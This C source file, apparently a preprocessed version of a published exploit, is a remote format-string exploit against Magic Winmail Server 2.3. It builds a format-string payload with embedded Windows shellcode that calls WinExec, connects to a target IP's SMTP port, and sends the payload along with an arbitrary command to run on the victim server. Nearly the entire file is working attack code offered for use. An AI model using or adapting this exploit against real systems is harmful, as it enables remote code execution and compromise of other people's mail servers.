
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int sin ;
typedef int WSADATA ;
typedef int WORD ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
typedef int SOCKET ;
typedef TYPE_2__ SOCKADDR_IN ;
typedef int SOCKADDR ;


 int AF_INET ;
 int ExitProcess (int) ;
 int INADDR_NONE ;
 int MAKEWORD (int,int ) ;
 int SOCK_STREAM ;
 scalar_t__ WSAStartup (int ,int *) ;
 int atoi (char*) ;
 scalar_t__ connect (int ,int *,int) ;
 int htons (int) ;
 int inet_addr (char*) ;
 int ntohs (int ) ;
 int printf (char*,...) ;
 int puts (char*) ;
 int recv (int ,char*,int,int ) ;
 int send (int ,char*,int,int ) ;
 int socket (int ,int ,int ) ;
 int strlen (char*) ;

void main (int argc, char *argv[])
{

 SOCKET sock;

 char buffer[1000];
 int i;


 char vuln[] =
  "\xec\xfc\x66\x01%x%x"
  "\xed\xfc\x66\x01%x%x"
  "\xee\xfc\x66\x01"

  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%28x%n"
  "%97x%n%105x%hn"
 "\x00\x90\x90\x90\x90"
 "\xEB\x50\x5E\x8B\xEC\x83\xEC\x28\xC7\x45\xD8\x4B\x65\x72\x6E\xC7"
 "\x45\xDC\x65\x6C\x33\x32\xC7\x45\xE0\x00\x00\x00\x00\xC7\x45\xE4"
 "\x57\x69\x6E\x45\xC7\x45\xE8\x78\x65\x63\x00\xC6\x45\xEB\x00\xBA"
 "\xAC\x01\x4D\x00\x8D\x45\xD8\x50\xFF\x12\x8D\x5D\xE4\x53\x50\xBA"
 "\xEC\x00\x4D\x00\xFF\x12\x6A\x01\x56\xFF\xD0\xBA\x98\x01\x4D\x00"
 "\xFF\x12\xE8\xAB\xFF\xFF\xFF";

 SOCKADDR_IN sin;
 WSADATA wsadata;
 WORD wVersionRequested = MAKEWORD (2,0);


 printf ("* #################################### *\n"
  "  Magic Winmail Server 2.3(Build 0402)\n"
  "     Remote format string exploit !\n"
  "* #################################### *\n"
  "  Coded By ThreaT -> ThreaT\n\n");

 if (argc < 3 || strlen (argv[2]) > 90)
 {
 printf ("usage : mwmxploit <Target IP> <command to execute> [smtp port]\n\n"
   " + The command to execute cannot exceed 90 characters +\n");
 ExitProcess (0);
 }

 if ( WSAStartup(wVersionRequested, &wsadata) )
 {
  printf ("Erreur d'initialisation winsock !\n");
  ExitProcess (1);
 }

 sin.sin_family = AF_INET;
 sin.sin_port = htons ((void *)argv[3] ? atoi (argv[3]) : 25);

 if ( (sin.sin_addr.s_addr = inet_addr (argv[1])) == INADDR_NONE)
 {
  printf ("Erreur : L'adresse IP de la victime est incorrect !\n");
  ExitProcess (2);
 }

 printf ("connecting to %s on port %u...", argv[1], ntohs ( sin.sin_port ) );

 sock = socket (AF_INET, SOCK_STREAM, 0);
 if ( connect (sock, (SOCKADDR *)&sin, sizeof (sin)) )
 {
  printf ("erreur : connexion impossible !\n");
  ExitProcess (3);
 }

 recv (sock,buffer,1000,0);

 printf ("ok\n-> %s\nsending exploit code...",buffer);

 send (sock, vuln, strlen (vuln) + 92, 0);
 send (sock, argv[2], strlen (argv[2]), 0);
 send (sock, "\r\n", 2, 0);

 recv (sock,buffer,1000,0);

 puts ("ok");
}
